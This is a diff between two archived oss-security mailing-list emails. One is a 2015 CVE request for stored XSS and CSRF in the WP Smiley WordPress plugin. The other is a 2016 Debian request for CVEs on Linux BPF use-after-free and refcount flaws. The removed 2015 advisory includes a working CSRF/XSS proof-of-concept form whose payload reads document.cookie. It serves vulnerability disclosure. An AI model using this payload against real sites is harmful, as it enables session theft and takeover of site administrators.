@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["9016" "Friday" "29" "May" "2015" "14:40:01" "+0300" "Henri Salo" "Henri.Salo@nixu.com" "<20150529114001.GB739@nixu.com>" "218" "[oss-security] CVE request: XSS and CSRF in WP Smiley plugin for WordPress" nil nil nil "5" "2015052911:40:01" "[oss-security] CVE request: XSS and CSRF in WP Smiley plugin for WordPress" (number mark "U       Henri.Salo@n May 29  218/9016  " thread-indent "\"[oss-security] CVE request: XSS and CSRF in WP Smiley plugin for WordPress\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["905" "Friday" "6" "May" "2016" "15:14:55" "+0200" "Salvatore Bonaccorso" "carnil@debian.org" "<20160506131455.GA17272@lorien.valinor.li>" "28" "[oss-security] CVE Requests: Linux: BPF flaws (one use-after-free / local root privilege escalation)" nil nil nil "5" "2016050613:14:55" "[oss-security] CVE Requests: Linux: BPF flaws (one use-after-free / local root privilege escalation)" (number mark "U       carnil@debia May  6   28/905   " thread-indent "\"[oss-security] CVE Requests: Linux: BPF flaws (one use-after-free / local root privilege escalation)\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 32041 invoked by uid 550); 29 May 2015 12:01:15 -0000
+Received: (qmail 19508 invoked by uid 550); 6 May 2016 13:15:08 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,234 +11,71 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 11520 invoked from network); 29 May 2015 11:40:14 -0000
-Message-ID: <20150529114001.GB739@nixu.com>
-MIME-Version: 1.0
-Content-Type: text/plain; charset="utf-8"; x-action=pgp-signed
-Content-Transfer-Encoding: quoted-printable
-User-Agent: Mutt/1.5.23 (2014-03-12)
-CC: <cve-assign@mitre.org>, <joni.hauhia@nixu.com>
-Date: Fri, 29 May 2015 14:40:01 +0300
-From: Henri Salo <Henri.Salo@nixu.com>
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] CVE request: XSS and CSRF in WP Smiley plugin for WordPress
-To: <oss-security@lists.openwall.com>
+Received: (qmail 19490 invoked from network); 6 May 2016 13:15:08 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20120113;
+        h=sender:date:from:to:cc:subject:message-id:mime-version
+         :content-disposition:user-agent;
+        bh=9H6LpdYlpj9CthrFkqY04YG+9q33WMkD8zy2DYKz6p8=;
+        b=lmDKUwl+g1e/Idn2v/0AxYuz6OP2c5+ioEqeUSSHXkXBBdEzuJzshfgWjy6NIogyfo
+         VyRPB2fnoLVEAAVSNqflaL0lvDljCeZMjWHtplPUAJVbatfKJ/7O34RQGRs48YTUoVYU
+         VwfSZcAhn/EywWL8TDyStWdae0p5OtspPATAq6bZjRbvDKi4ZJMIclFvM2IDSh1eL7y6
+         kdDHqusGh+jVCKaF6GIA7CUkmV9z93WMAfGLDvq19upIQ62QbPJ/rd8KY9xBCkn2Xo9e
+         tebwxGdqjnQAz7NCLkJeYNYq1tDUIqEU8Fp+5cYmT1aAte6B90Dkvksfm2q62HPhQbIx
+         2RAQ==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20130820;
+        h=x-gm-message-state:sender:date:from:to:cc:subject:message-id
+         :mime-version:content-disposition:user-agent;
+        bh=9H6LpdYlpj9CthrFkqY04YG+9q33WMkD8zy2DYKz6p8=;
+        b=VRm8l3C1GGzwAEnyMjYqGVcbENXcrv3aD7tn5RUxuWeK935XFwiaAB55Qh+MgQFfIy
+         fTZTB6IBfJ/BvOoVnjw6ePW7/WuxnaRCLrvvztzBnXmTXsah/nNa3UDlmcNNgKG5yrcw
+         hAJ9noSoAIAM+ojg+GYl6eiGBhsxKnG2Cp3JShcm6dc/SAqEI8wm3XU5eXJP4YdQxNvD
+         L+ziUi1N6r7EXt2rSGQGnji0LYXrO76xglQ/sFCnUfhYG/xXs1RNa98zwkTaBWnsC+Sw
+         jaCezHS5z48Q4mMZkPnsWY+saxWKDxw6ubf9kPDBdCDQ67+y6z2FLUzFYbFvbQQnm6m+
+         E8cQ==
+X-Gm-Message-State: AOPr4FVfc4WPrGU712vNwGdfFVXnaq/E/2ru9vmpM66KXdQ2PDfFw51UK2k22KAANr0QTw==
+X-Received: by 10.28.94.12 with SMTP id s12mr9715400wmb.54.1462540496836;
+        Fri, 06 May 2016 06:14:56 -0700 (PDT)
+Sender: Salvatore Bonaccorso <salvatore.bonaccorso@gmail.com>
+Date: Fri, 6 May 2016 15:14:55 +0200
+From: Salvatore Bonaccorso <carnil@debian.org>
+To: OSS Security Mailinglist <oss-security@lists.openwall.com>
+Cc: Ben Hutchings <benh@debian.org>
+Message-ID: <20160506131455.GA17272@lorien.valinor.li>
+MIME-Version: 1.0
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
+User-Agent: Mutt/1.5.23 (2014-03-12)
+Subject: [oss-security] CVE Requests: Linux: BPF flaws (one use-after-free / local root
+ privilege escalation)
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA1
+A use-after-free flaw via double-fdput in bpf was recently fixed in
+Linux. Details:
 
-We found following vulnerabilities with Joni Hauhia. Could you assign CVE f=
-or
-these issues, thanks.
+https://bugs.chromium.org/p/project-zero/issues/detail?id=808
 
-Product: WordPress plugin wp-smiley
-Plugin page: https://wordpress.org/plugins/wp-smiley/
-Developer: As247 (no contact information available)
-Vulnerability Type:
-  CWE-79: Cross-site scripting
-  CWE-352: Cross-Site Request Forgery
-Vulnerable Versions: 1.4.1
-Fixed Version: N/A
-Solution Status: N/A
-Vendor Notification: 2015-03-24
-Public Disclosure: 2015-05-29
+Fixed via:
+https://git.kernel.org/linus/8358b02bf67d3a5d8a825070e1aa73f25fb2e4c7
 
-Vulnerability details:
+And as well reported/forwarded in Debian:
+https://bugs.debian.org/823603
 
-WP Smiley plugin for WordPress contains a flaw that allows a stored
-cross-site-scripting (XSS) attack. This flaw exists because the smilies4wp.=
-php
-script does not validate input properly before returning it to users. This
-allows an authenticated remote attacker to create a specially crafted reque=
-st
-that would execute arbitrary script code in a user's browser session within=
- the
-trust relationship between their browser and the server.
+Could you please assign a CVE for this issue?
 
-Editor-level user account can use this cross-site scripting vulnerability
-against Administrator-level users.
+The following two might as well warrant a CVE (Ben Hutchings CC'ed has
+already applied those to the packaging repository in Debian):
 
-Root cause:
+bpf: fix refcnt overflow:
+https://git.kernel.org/linus/92117d8443bc5afacc8d5ba82e541946310f106e
 
-The software incorrectly sanitizes user-controllable input before it is pla=
-ced
-in output that is used as a web page that is served to users.
+bpf: fix check_map_func_compatibility logic
+https://git.kernel.org/linus/6aff67c85c9e5a4bc99e5211c1bac547936626ca
 
-Proof-of-concept:
+Not sure though if the later one has a security impact. The bug
+allowed generic map functions to be applied to special map types
+(program, perf events) that did not support them properly.
 
-This vulnerability can be demonstrated with following cross-site request fo=
-rgery
-PoC below.
-
-Notes:
-
-Other parameters are also possibly insecure (not tested). Other versions not
-tested.
-
-References:
-
-Cross-site Scripting:
-    http://cwe.mitre.org/data/definitions/79.html
-    https://scapsync.com/cwe/CWE-79
-    https://en.wikipedia.org/wiki/Cross-site_scripting
-
-Cross-Site Request Forgery:
-    http://cwe.mitre.org/data/definitions/352.html
-    https://scapsync.com/cwe/CWE-352
-    https://en.wikipedia.org/wiki/Cross-site_request_forgery
-
-Timeline:
-
-2015-03-24: Notification about vulnerability for WordPress plugins team
-2015-03-24: CVE request from MITRE (no response)
-2015-03-25: WordPress plugins team responds and disables plugin from archive
-2015-04-10: Sent emails to sites, which I knew using this plugin
-2015-04-15: Asked status of CVE from MITRE (no response)
-2015-05-29: Public disclosure
-
-CSRF XSS PoC:
-
-<html>
-  <body>
-    <form action=3D"https://example.com/wp-admin/options-general.php?page=
-=3Dsmilies4wp.php" method=3D"POST">
-      <input type=3D"hidden" name=3D"s4w&#45;disp" value=3D"&quot;&gt;" />
-      <input type=3D"hidden" name=3D"s4w&#45;cfid" value=3D"comment" />
-      <input type=3D"hidden" name=3D"s4w&#45;more" value=3D"More&gt;&gt;&qu=
-ot;&gt;&lt;img&#32;src&#61;&apos;&#35;&apos;&#32;onerror&#61;alert&#40;docu=
-ment&#46;cookie&#41;&#32;&#47;&gt;" />
-      <input type=3D"hidden" name=3D"s4w&#45;less" value=3D"Less&lt;&lt;" />
-      <input type=3D"hidden" name=3D"s4w&#45;cp" value=3D"1" />
-      <input type=3D"hidden" name=3D"s4w&#45;cc" value=3D"1" />
-      <input type=3D"hidden" name=3D"s4w&#45;cfa" value=3D"1" />
-      <input type=3D"hidden" name=3D"s4w&#45;update" value=3D"Update&#32;=
-=EF=BF=BD&#187;" />
-      <input type=3D"hidden" name=3D"icon&#95;evil&#124;gif&#91;&#93;" valu=
-e=3D"&#58;&#41;" />
-      <input type=3D"hidden" name=3D"icon&#95;evil&#124;gif&#91;&#93;" valu=
-e=3D"" />
-      <input type=3D"hidden" name=3D"icon&#95;surprised&#124;gif&#91;&#93;"=
- value=3D"" />
-      <input type=3D"hidden" name=3D"icon&#95;surprised&#124;gif&#91;&#93;"=
- value=3D"" />
-      <input type=3D"hidden" name=3D"icon&#95;question&#124;gif&#91;&#93;" =
-value=3D"" />
-      <input type=3D"hidden" name=3D"icon&#95;question&#124;gif&#91;&#93;" =
-value=3D"" />
-      <input type=3D"hidden" name=3D"icon&#95;mad&#124;gif&#91;&#93;" value=
-=3D"" />
-      <input type=3D"hidden" name=3D"icon&#95;mad&#124;gif&#91;&#93;" value=
-=3D"" />
-      <input type=3D"hidden" name=3D"icon&#95;confused&#124;gif&#91;&#93;" =
-value=3D"" />
-      <input type=3D"hidden" name=3D"icon&#95;confused&#124;gif&#91;&#93;" =
-value=3D"" />
-      <input type=3D"hidden" name=3D"icon&#95;twisted&#124;gif&#91;&#93;" v=
-alue=3D"" />
-      <input type=3D"hidden" name=3D"icon&#95;twisted&#124;gif&#91;&#93;" v=
-alue=3D"" />
-      <input type=3D"hidden" name=3D"icon&#95;neutral&#124;gif&#91;&#93;" v=
-alue=3D"" />
-      <input type=3D"hidden" name=3D"icon&#95;neutral&#124;gif&#91;&#93;" v=
-alue=3D"" />
-      <input type=3D"hidden" name=3D"icon&#95;mrgreen&#124;gif&#91;&#93;" v=
-alue=3D"" />
-      <input type=3D"hidden" name=3D"icon&#95;mrgreen&#124;gif&#91;&#93;" v=
-alue=3D"" />
-      <input type=3D"hidden" name=3D"icon&#95;redface&#124;gif&#91;&#93;" v=
-alue=3D"" />
-      <input type=3D"hidden" name=3D"icon&#95;redface&#124;gif&#91;&#93;" v=
-alue=3D"" />
-      <input type=3D"hidden" name=3D"icon&#95;razz&#124;gif&#91;&#93;" valu=
-e=3D"" />
-      <input type=3D"hidden" name=3D"icon&#95;razz&#124;gif&#91;&#93;" valu=
-e=3D"" />
-      <input type=3D"hidden" name=3D"icon&#95;smile&#124;gif&#91;&#93;" val=
-ue=3D"" />
-      <input type=3D"hidden" name=3D"icon&#95;smile&#124;gif&#91;&#93;" val=
-ue=3D"" />
-      <input type=3D"hidden" name=3D"icon&#95;cool&#124;gif&#91;&#93;" valu=
-e=3D"" />
-      <input type=3D"hidden" name=3D"icon&#95;cool&#124;gif&#91;&#93;" valu=
-e=3D"" />
-      <input type=3D"hidden" name=3D"icon&#95;exclaim&#124;gif&#91;&#93;" v=
-alue=3D"" />
-      <input type=3D"hidden" name=3D"icon&#95;exclaim&#124;gif&#91;&#93;" v=
-alue=3D"" />
-      <input type=3D"hidden" name=3D"icon&#95;lol&#124;gif&#91;&#93;" value=
-=3D"" />
-      <input type=3D"hidden" name=3D"icon&#95;lol&#124;gif&#91;&#93;" value=
-=3D"" />
-      <input type=3D"hidden" name=3D"icon&#95;wink&#124;gif&#91;&#93;" valu=
-e=3D"" />
-      <input type=3D"hidden" name=3D"icon&#95;wink&#124;gif&#91;&#93;" valu=
-e=3D"" />
-      <input type=3D"hidden" name=3D"icon&#95;cry&#124;gif&#91;&#93;" value=
-=3D"" />
-      <input type=3D"hidden" name=3D"icon&#95;cry&#124;gif&#91;&#93;" value=
-=3D"" />
-      <input type=3D"hidden" name=3D"icon&#95;biggrin&#124;gif&#91;&#93;" v=
-alue=3D"" />
-      <input type=3D"hidden" name=3D"icon&#95;biggrin&#124;gif&#91;&#93;" v=
-alue=3D"" />
-      <input type=3D"hidden" name=3D"icon&#95;idea&#124;gif&#91;&#93;" valu=
-e=3D"" />
-      <input type=3D"hidden" name=3D"icon&#95;idea&#124;gif&#91;&#93;" valu=
-e=3D"" />
-      <input type=3D"hidden" name=3D"icon&#95;rolleyes&#124;gif&#91;&#93;" =
-value=3D"" />
-      <input type=3D"hidden" name=3D"icon&#95;rolleyes&#124;gif&#91;&#93;" =
-value=3D"" />
-      <input type=3D"hidden" name=3D"icon&#95;eek&#124;gif&#91;&#93;" value=
-=3D"" />
-      <input type=3D"hidden" name=3D"icon&#95;eek&#124;gif&#91;&#93;" value=
-=3D"" />
-      <input type=3D"hidden" name=3D"icon&#95;arrow&#124;gif&#91;&#93;" val=
-ue=3D"" />
-      <input type=3D"hidden" name=3D"icon&#95;arrow&#124;gif&#91;&#93;" val=
-ue=3D"" />
-      <input type=3D"hidden" name=3D"icon&#95;sad&#124;gif&#91;&#93;" value=
-=3D"" />
-      <input type=3D"hidden" name=3D"s4w&#45;style" value=3D"&#9;&#46;s4w&#=
-45;smilies&#32;&#123;&#13;&#10;&#9;text&#45;align&#58;&#32;center&#59;&#13;=
-&#10;&#9;position&#58;relative&#59;&#13;&#10;&#9;height&#58;0px&#59;&#13;&#=
-10;&#125;&#13;&#10;&#46;s4w&#45;smilies&#45;content&#32;&#123;&#13;&#10;&#9=
-;width&#58;&#32;300px&#59;&#13;&#10;&#9;padding&#58;&#32;3px&#59;&#13;&#10;=
-&#9;line&#45;height&#58;&#32;120&#37;&#59;&#13;&#10;&#9;position&#58;absolu=
-te&#59;&#13;&#10;&#9;border&#58;&#32;1px&#32;solid&#32;&#35;BFCAD2&#59;&#13=
-;&#10;&#9;background&#58;&#35;fff&#59;&#13;&#10;&#9;left&#58;160px&#59;&#13=
-;&#10;&#9;top&#58;&#45;10px&#59;&#13;&#10;&#9;&#13;&#10;&#125;&#13;&#10;&#4=
-6;wp&#45;smiley&#45;button&#32;&#123;&#13;&#10;border&#58;&#32;1px&#32;soli=
-d&#32;&#35;ccc&#59;&#13;&#10;margin&#58;&#32;1px&#59;&#13;&#10;padding&#58;=
-&#32;2px&#59;&#13;&#10;&#125;&#13;&#10;&#46;wp&#45;smiley&#45;button&#58;ho=
-ver&#32;&#123;&#13;&#10;cursor&#58;pointer&#59;&#13;&#10;filter&#58;progid&=
-#58;DXImageTransform&#46;Microsoft&#46;Alpha&#40;opacity&#61;60&#41;&#59;&#=
-13;&#10;&#45;moz&#45;opacity&#58;&#32;0&#46;6&#59;&#13;&#10;&#125;" />
-      <input type=3D"submit" value=3D"Submit request" />
-    </form>
-  </body>
-</html>
-
-- --=20
-Henri Salo
-Security Specialist, Nixu Oy
-Mobile: +358 40 770 5733
-PL 39 FIN (Keilaranta 15)
-FIN-02151 Espoo, Finland
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
-
-iQIcBAEBAgAGBQJVaFARAAoJEHu3+uinl6paKbkP/0/77ILgY2/T+nybAinYTSy+
-JWs76w2UL9lyh1lRo3g+CE7RfTj56RB6tObZ6phMahgZKo/w6sVllk0L/MS8G1QR
-pHaTsTnpAR0rqFE8fqzPQ4QsQ0Zv1Exn+FVXke6qF0RzGVdXwVoiZseTg2wAxOWg
-zqvlAPGd2dQvvTmmUIBj8QTfNw8Z1jJhxNdVQ5fhg5fNPjcRzBO5pfeIeLu6yrvs
-717ATOsInJ19iZKVw6IrId12XBvKmX3VDX2HJMY0vwFUSmdEUSNUsgOV6QsAHu+I
-EffEUJYDPIuC4zaEo7dT4OwwzjE8YPQ87xUW1cXMEWf8619PRj0GQ0fQuQ+q/Zl4
-A6RmayvvGLSu4ogsbb5HFJubCdFuRR0y3HXMXbVCQZdeRzDjgJAiFjpS0zRG8W/q
-Hwpco++dSJowSvyiouk9SZA0Zf9t69Ro4nIYUgMrn+BfZFII7YIlFfuWXD2qpPsE
-mxlsCkwFAta2I4fZXDtl0QJqwqghs4PexeMqFhCfN3BeXLeItZuON9cL0X6av+oZ
-O3P5qt4D0lb22t/Onj0VDx/wkK8ZQOifMdluHGLb7HOnoIpELlpfYwo+b4NaoDIh
-oIGDm97IGyDByejNBQ97XNCvQoy42WNhpAeCqIW6eXcMYssO0r4uhZmAvSbzWASZ
-yrT8K8gJgUBnXwS0XP10
-=3DchYh
------END PGP SIGNATURE-----
+Regards,
+Salvatore
